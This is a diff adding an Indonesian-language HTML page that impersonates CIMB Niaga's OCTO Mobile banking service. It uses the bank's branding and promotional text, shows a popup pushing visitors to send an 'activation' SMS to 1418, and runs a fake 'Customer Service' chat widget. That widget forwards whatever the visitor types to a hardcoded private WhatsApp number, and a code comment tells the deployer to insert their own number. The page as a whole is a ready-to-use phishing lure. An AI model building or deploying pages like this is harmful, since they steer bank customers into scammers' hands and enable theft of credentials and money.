@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta content='#780001' name='theme-color'/>
+ <meta content="https://www.cimbniaga.co.id/content/dam/cimb/tabungan-transaksi/video-banner-octosavers-60x-female.jpg" property="og:image">
+  <meta content="cimbniaga.co.id" property="twitter:title">
+  <meta name="description" content="Cuma tabungan ini yang berani kasih banyak bebas biaya sebanyak 60x setiap bulannya plus yang buka tabungannya hari ini sampai 31 Maret 2023 bakal dapat cashback hingga Rp 500 Ribu.">
+<meta content="cimbniaga.co.id" property="og:title">
+  <meta content="width=device-width, initial-scale=1" name="viewport"> <link rel="canonical" href="https://www.cimbniaga.co.id/id/personal/tabungan/octo.mobile">
+ <title>CIMB NIAGA | OCTO MOBILE</title>
+<link href="https://uploads-ssl.webflow.com/63b790a102e67e44421cf01b/63b7a3a1a857156018b0aece_AddText_01-06-11.29.11.jpg" rel="shortcut icon" type="image/x-icon">
+  <link href="https://uploads-ssl.webflow.com/63b790a102e67e44421cf01b/63b7a3a051c7864b3bc19723_AddText_01-06-11.28.58.jpg" rel="apple-touch-icon">
+  <!--====== Design by foolishdeveloper.com =====-->
+  
+  
+    <title>Automatic Popup</title>
+    <!--Google Fonts-->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
+    <!--Stylesheets-->
+    <style media="screen">
+      *,
+*:before,
+*:after{
+    padding: 0;
+    margin: 0;
+    box-sizing: border-box;
+}
+body, html {
+  background-image: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikOxucuCkAQzL6kpZw7qu2KoKExYvsatV8XEy7BjV4s6470A2GRl695yNJo6N-S2B5fzTcmj0AzNgVDGblHKtbiTa19SzJeo2ie65_4rwcC2IRAAcg8ADCgilvZsORVTzT1PzEVBwCkEesbwkoovARkd5utkNE6jQP_u43TkXjjYYzwndvptdkPyju/s2158/AddText_02-19-11.50.38.jpg");
+  font-family: "Source Sans Pro", sans-serif;
+  background-size: cover;
+         background-position: center;
+       background-repeat: no-repeat;
+         height: 700px;
+         margin-top: 0px;
+  font-size: 16px;
+  position: fixed;
+  width: 100%;
+  height: ;
+ 
+}
+.popup{
+    background-color: #ffffff;
+    width: 300px;
+    height: 160px;
+    padding: 30px 40px;
+    position: absolute;
+    transform: translate(-50%,-50%);
+    left: 50%;
+    top: 50%;
+    border: 2px solid;
+    border-radius: 5px;
+    font-family: "Poppins",sans-serif;
+    display: none; 
+    text-align: center;
+    box-shadow: #D5D5D5 10px;
+ z-index: 99999;
+}
+.popup button{
+    display: block;
+    margin:  0 0 20px auto;
+    background-color: red;
+    font-size: 14px;
+    color: #ffffff;
+    background: #03549a;
+    border-radius: 5%;
+    margin-left: 0px;
+    width: 100%;
+    height: 35px;
+    border: none;
+    outline: none;
+    cursor: pointer;
+}
+.popup h2{
+  margin-top: -20px;
+  font-size: 15px;
+  text-align: center;
+  font-weight: bold;
+}
+.popup p{
+    font-size: 12px;
+    text-align: center;
+    font-weight: 800;
+    margin: 20px 0;
+    line-height: 14px;
+}
+a{
+    display: block;
+    width: 150px;
+    position: relative;
+    margin: 10px auto;
+    text-align: center;
+    background-color: #0f72e5;
+    border-radius: 20px;
+    color: #ffffff;
+    text-decoration: none;
+    padding: 8px 0;
+}
+disabled{
+    background: #fff;
+    opacity: 1.0;
+    
+}
+  :root {
+  --ewc-color-1: #ffffff;
+  --ewc-color-2: #eae1da;
+  --ewc-color-3: #25d366;
+  --ewc-color-3-dark: #0bac46;
+  --ewc-color-4: #00796a;
+}
+
+.ewChat {
+  position: absolute;
+  bottom: 346px;
+  right: 152px;
+  font-family: "Roboto", sans-serif;
+  margin: 0;
+  
+  padding: 0;
+  width: 340px;
+  max-width: calc(100% - 60px);
+  display: flex;
+  flex-direction: column;
+  align-items: flex-end;
+  z-index: 9999;
+}
+
+.ewChatBox {
+  width: 90%;
+  background-color: var(--ewc-color-2);
+  position: fixed;
+  top: 250px;
+  left: 17px;
+  border-radius: 15px;
+  display: none;
+  opacity: 0;
+  transition: opacity 1000ms;
+  flex-direction: column;
+}
+
+.ewChatClose {
+  color: var(--ewc-color-1);
+  display: none;
+  position: absolute;
+  top: -35px;
+  right: 0;
+  border: none;
+  padding: 4px;
+  border-radius: 100%;
+  background-color: var(--ewc-color-4);
+}
+
+.ewChatClose:hover {
+  background-color: var(--ewc-color-3);
+}
+
+.ewChatCloseMobile {
+  width: 100%;
+  position: absolute;
+  text-align: center;
+  color: var(--ewc-color-1);
+  top: -300px;
+  padding: 100px 0;
+  cursor: pointer;
+}
+
+.ewChatAvatar {
+  position: absolute;
+  left: calc(50% - 32px);
+  top: -80px;
+  width: 59px;
+  height: 59px;
+  padding: 3px;
+  border: solid 2px var(--ewc-color-3);
+  border-radius: 100%;
+  background-color: var(--ewc-color-1);
+  display: flex;
+}
+.ewChatAvatar img {
+  border-radius: 100%;
+}
+
+.ewChatHeader {
+  background-color: var(--ewc-color-4);
+  color: var(--ewc-color-1);
+  border-radius: 15px 15px 0 0;
+  padding: 12px;
+  text-align: center;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+}
+
+.ewChatHeader h3 {
+  color: var(--ewc-color-1);
+  font-size: 18px;
+  margin: 3px;
+}
+.ewChatHeader p {
+  font-size: 12px;
+  margin: 0;
+}
+
+.ewChatBubble {
+  background-color: var(--ewc-color-1);
+  margin: 10px 18px 10px 30px;
+  padding: 9px 9px 25px 9px;
+  text-align: left;
+  border-radius: 0 10px 10px 10px;
+  position: relative;
+  opacity: 0;
+  transition: opacity 1000ms;
+}
+
+.ewChatBubble:after {
+  content: "";
+  position: absolute;
+  left: 0;
+  top: 0;
+  width: 0;
+  height: 0;
+  border: 15px solid transparent;
+  border-right-color: var(--ewc-color-1);
+  border-left: 0;
+  border-top: 0;
+  margin-top: 0;
+  margin-left: -15px;
+}
+
+.ewChatBubble p {
+  margin: 0;
+  font-size: 14px;
+}
+
+.ewChatBubble span {
+  position: absolute;
+  bottom: 5px;
+  right: 9px;
+  opacity: 0.5;
+  font-size: 11px;
+}
+
+.ewChatInput {
+  display: none;
+  opacity: 0;
+  position: fixed;
+  transition: opacity 1000ms;
+  width: 90%;
+  top: 430px;
+  left: 17px;
+  margin-top: 10px;
+  background-color: var(--ewc-color-1);
+  height: 48px;
+  border-radius: 24px;
+}
+
+.ewChatInput input {
+  font-family: "Roboto", sans-serif;
+  font-size: 16px;
+  background-color: var(--ewc-color-1);
+  height: 32px;
+  margin: auto 20px;
+  width: 100%;
+  border: none;
+}
+
+.ewChatInput input:focus {
+  outline: none;
+}
+
+.ewChatInput button {
+  border: none;
+  background-color: var(--ewc-color-4);
+  border-radius: 20px;
+  margin: 4px;
+  color: var(--ewc-color-1);
+  padding: 8px;
+}
+
+.ewChatInput button:hover {
+  background-color: var(--ewc-color-3);
+}
+
+.ewChatDesktop {
+  cursor: pointer;
+  display: none;
+  align-items: center;
+  height: 36px;
+  border-radius: 25px;
+  background-color: var(--ewc-color-3);
+  width: 68%;
+  padding: 4px 20px;
+  font-size: 14px;
+  color: var(--ewc-color-1);
+  margin-top: 20px;
+}
+
+.ewChatDesktop svg {
+  margin-right: 10px;
+}
+
+.ewChatMobile {
+  cursor: pointer;
+  padding: 10px;
+  background-color: var(--ewc-color-3);
+  display: flex;
+  border-radius: 100%;
+  color: var(--ewc-color-1);
+  border: solid 2px var(--ewc-color-1);
+  margin-top: 80px;
+}
+
+.ewChatMobile:hover,
+.ewChatDesktop:hover {
+  background-color: var(--ewc-color-3-dark);
+}
+
+.ewChatBackdrop {
+  position: fixed;
+  inset: 0;
+  background-color: rgba(0, 0, 0, 0.5);
+  z-index: 998;
+}
+
+/* Responsive */
+@media screen and (min-width: 450px) {
+  .ewChatAvatar {
+    left: -80px;
+    top: 80px;
+  }
+
+  .ewChatClose,
+  .ewChatDesktop {
+    display: flex;
+  }
+
+  .ewChatMobile,
+  .ewChatCloseMobile {
+    display: none;
+  }
+}
+
+    </style>
+</head>
+<body>
+ <link rel="stylesheet" href="./style.css"> 
+  <!-- partial:index.partial.html --> 
+  <div class="ewChat"> 
+   <!-- Chat Box --> 
+   <div id="ewChatBox" class="ewChatBox ewc_hidden" style="display: none" aria-hidden="true"> 
+    <!-- Tombol Close --> 
+    <button id="ewChatClose" class="ewChatClose ewc_close"> 
+     <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="18" height="18" viewbox="0 0 24 24"> 
+      <path fill="currentColor" d="M13.41 12l4.3-4.29a1 1 0 1 0-1.42-1.42L12 10.59l-4.29-4.3a1 1 0 0 0-1.42 1.42l4.3 4.29l-4.3 4.29a1 1 0 0 0 0 1.42a1 1 0 0 0 1.42 0l4.29-4.3l4.29 4.3a1 1 0 0 0 1.42 0a1 1 0 0 0 0-1.42z"></path> 
+     </svg> </button> 
+    <div class="ewChatCloseMobile ewc_close">
+      Ketuk disini untuk menutup 
+    </div> 
+    <!-- Avatar --> 
+    <div class="ewChatAvatar"> 
+     <img alt="" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRvAb4MZrifyElbUScfuJhB7ZC81Ex3HfxKwUAZ122a6uSBrlMzq1UHHrg&s=10"> 
+    </div> 
+    <!-- Header --> 
+    <div class="ewChatHeader"> 
+     <h3>Butuh bantuan? Chat sekarang!</h3> 
+     <p>Customer Service kami akan membantu Anda,.</p> 
+     <p> terima kasih</p> 
+    </div> 
+    <!-- Bubble Chat --> 
+    <div> 
+     <div id="ewChatBubble" class="ewChatBubble"> 
+      <p> Halo? Saya yang akan membantu Anda seputar informasi umum produk dan promo. mulai chat dibawah, </p> 
+      <span>Sekarang</span> 
+     </div> 
+    </div> 
+   </div> 
+   <!-- Chat Input --> 
+   <div id="ewChatInput" class="ewChatInput ewc_hidden" style="display: none" aria-hidden="true"> 
+    <input id="ewc_message" name="ewc_message" type="text" placeholder="Ketik sesuatu. . . ."> 
+    <button id="ewc_send"> 
+     <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24" height="24" viewbox="0 0 16 16"> 
+      <g fill="none"> 
+       <path d="M1.724 1.053a.5.5 0 0 0-.714.545l1.403 4.85a.5.5 0 0 0 .397.354l5.69.953c.268.053.268.437 0 .49l-5.69.953a.5.5 0 0 0-.397.354l-1.403 4.85a.5.5 0 0 0 .714.545l13-6.5a.5.5 0 0 0 0-.894l-13-6.5z" fill="currentColor"></path> 
+      </g> 
+     </svg> </button> 
+   </div> 
+   <!-- Tombol Untuk Menampilkan Kotam Chat Desktop --> 
+   <div id="ewc_desktop_button" class="ewChatDesktop ewc_open"> 
+    <div> 
+     <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="22" height="22" viewbox="0 0 24 24"> 
+      <g fill="none"> 
+       <path fill-rule="evenodd" clip-rule="evenodd" d="M17.415 14.382c-.298-.149-1.759-.867-2.031-.967c-.272-.099-.47-.148-.669.15c-.198.296-.767.966-.94 1.164c-.174.199-.347.223-.644.075c-.297-.15-1.255-.463-2.39-1.475c-.883-.788-1.48-1.761-1.653-2.059c-.173-.297-.019-.458.13-.606c.134-.133.297-.347.446-.52c.149-.174.198-.298.297-.497c.1-.198.05-.371-.025-.52c-.074-.149-.668-1.612-.916-2.207c-.241-.579-.486-.5-.668-.51c-.174-.008-.372-.01-.57-.01c-.198 0-.52.074-.792.372c-.273.297-1.04 1.016-1.04 2.479c0 1.462 1.064 2.875 1.213 3.074c.149.198 2.095 3.2 5.076 4.487c.71.306 1.263.489 1.694.625c.712.227 1.36.195 1.872.118c.57-.085 1.758-.719 2.006-1.413c.247-.694.247-1.289.173-1.413c-.074-.124-.272-.198-.57-.347zm-5.422 7.403h-.004a9.87 9.87 0 0 1-5.032-1.378l-.36-.214l-3.742.982l.999-3.648l-.235-.374a9.861 9.861 0 0 1-1.511-5.26c.002-5.45 4.436-9.884 9.889-9.884c2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.892 6.993c-.002 5.45-4.436 9.885-9.884 9.885zm8.412-18.297A11.815 11.815 0 0 0 11.992 0C5.438 0 .102 5.335.1 11.892c-.001 2.096.546 4.142 1.587 5.945L0 24l6.304-1.654a11.881 11.881 0 0 0 5.684 1.448h.005c6.554 0 11.89-5.335 11.892-11.893a11.821 11.821 0 0 0-3.48-8.413" fill="currentColor"></path> 
+      </g> 
+     </svg> 
+    </div> 
+    <div>
+      Halo, ada yang bisa dibantu? 
+    </div> 
+   </div> 
+   <!-- Tombol Untuk Menampilkan Kotam Chat Mobile --> 
+   <div id="ewc_mobile_button" class="ewChatMobile ewc_open"> 
+    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewbox="0 0 24 24"> 
+     <g fill="none"> 
+      <path fill-rule="evenodd" clip-rule="evenodd" d="M17.415 14.382c-.298-.149-1.759-.867-2.031-.967c-.272-.099-.47-.148-.669.15c-.198.296-.767.966-.94 1.164c-.174.199-.347.223-.644.075c-.297-.15-1.255-.463-2.39-1.475c-.883-.788-1.48-1.761-1.653-2.059c-.173-.297-.019-.458.13-.606c.134-.133.297-.347.446-.52c.149-.174.198-.298.297-.497c.1-.198.05-.371-.025-.52c-.074-.149-.668-1.612-.916-2.207c-.241-.579-.486-.5-.668-.51c-.174-.008-.372-.01-.57-.01c-.198 0-.52.074-.792.372c-.273.297-1.04 1.016-1.04 2.479c0 1.462 1.064 2.875 1.213 3.074c.149.198 2.095 3.2 5.076 4.487c.71.306 1.263.489 1.694.625c.712.227 1.36.195 1.872.118c.57-.085 1.758-.719 2.006-1.413c.247-.694.247-1.289.173-1.413c-.074-.124-.272-.198-.57-.347zm-5.422 7.403h-.004a9.87 9.87 0 0 1-5.032-1.378l-.36-.214l-3.742.982l.999-3.648l-.235-.374a9.861 9.861 0 0 1-1.511-5.26c.002-5.45 4.436-9.884 9.889-9.884c2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.892 6.993c-.002 5.45-4.436 9.885-9.884 9.885zm8.412-18.297A11.815 11.815 0 0 0 11.992 0C5.438 0 .102 5.335.1 11.892c-.001 2.096.546 4.142 1.587 5.945L0 24l6.304-1.654a11.881 11.881 0 0 0 5.684 1.448h.005c6.554 0 11.89-5.335 11.892-11.893a11.821 11.821 0 0 0-3.48-8.413" fill="currentColor"></path> 
+     </g> 
+    </svg> 
+   </div> 
+  </div> 
+  <!-- Backdrop --> 
+  <div class="ewChatBackdrop ewc_hidden" style="display: none"></div> 
+  <!-- partial --> 
+    <div class="popup">
+      
+        <h2 style="font-weight: 800;">SILAHKAN KIRIM SMS KE 1418</h2>
+        <p>
+            Silahkan Klik Whatsapp untuk mendapat bantuan Format SMS Aktivasi
+        </p>
+  <button style="background: red;" id="close">OK</button>
+       
+    </div>
+    <div style="width: 100%; margin-top: 264px;">
+
+</div>
+    <form method="get" style="text-align: center;">
+    <textarea style="text-align: center; margin-top: 145px; width: 270px; height: 55px; border-radius: 10px; font-weight: 800; padding-top: 3px; border: 3px solid; opacity: 0.0;" disabled>Klik Whatsapp untuk mendapat bantuan Format SMS Aktivasi Tarif
+    </textarea>
+    </form>
+    <!--Script-->
+    <script type="text/javascript">
+window.addEventListener("load", function(){
+    setTimeout(
+        function open(event){
+            document.querySelector(".popup").style.display = "block";
+        },
+        2000 
+    )
+});
+
+
+document.querySelector("#close").addEventListener("click", function(){
+    document.querySelector(".popup").style.display = "none";
+});
+    </script>
+</body>
+</html>
+<script>
+
+
+// Ganti nomor WhatsApp berikut dengan nomor kamu
+const NOMOR_WHATSAPP = "6281210821892"; //Pastikan nomor diawali dengan kode negara tanpa tanda "+" (cth. 085-XXX-XXX-XXX diubah mendaji 6285-XXX-XXX-XXX)
+
+const ewc_hidden = document.querySelectorAll(".ewc_hidden");
+const ewc_button = document.querySelectorAll(".ewc_button");
+const ewc_audio = new Audio(
+  "https://cdn.pixabay.com/download/audio/2023/02/19/audio_7878efffe2.mp3?filename=mp3-output-ttsfreedotcom-5-139773.mp3"
+);
+
+const ewcShow = () => {
+  ewc_hidden.forEach((el) => {
+    el.style.display = "flex";
+    el.ariaHidden = "false";
+  });
+  ewc_audio.play();
+
+  setTimeout(() => {
+    ewc_hidden.forEach((el) => {
+      el.style.opacity = "1";
+    });
+  }, 0);
+
+  setTimeout(() => {
+    document.getElementById("ewChatBubble").style.opacity = "1";
+  }, 300);
+};
+
+const ewcHide = () => {
+  ewc_hidden.forEach((el) => {
+    el.style.opacity = "0";
+    document.getElementById("ewChatBubble").style.opacity = "0";
+    el.ariaHidden = "true";
+  });
+
+  setTimeout(() => {
+    ewc_hidden.forEach((el) => {
+      el.style.display = "none";
+    });
+  }, 1000);
+};
+
+function ewcOpen() {
+  if (ewChatBox.style.display == "none") {
+    ewcShow();
+  } else {
+    ewcHide();
+  }
+}
+
+document.querySelectorAll(".ewc_close").forEach((el) => {
+  el.addEventListener("click", ewcHide);
+});
+
+document.querySelectorAll(".ewc_open").forEach((el) => {
+  el.addEventListener("click", ewcOpen);
+});
+
+document.getElementById("ewc_send").addEventListener("click", () => {
+  window.open(
+    `https://wa.me/${NOMOR_WHATSAPP}?text=${encodeURI(
+      document.getElementById("ewc_message").value
+    )}`
+  );
+});
+</script>
+
+,
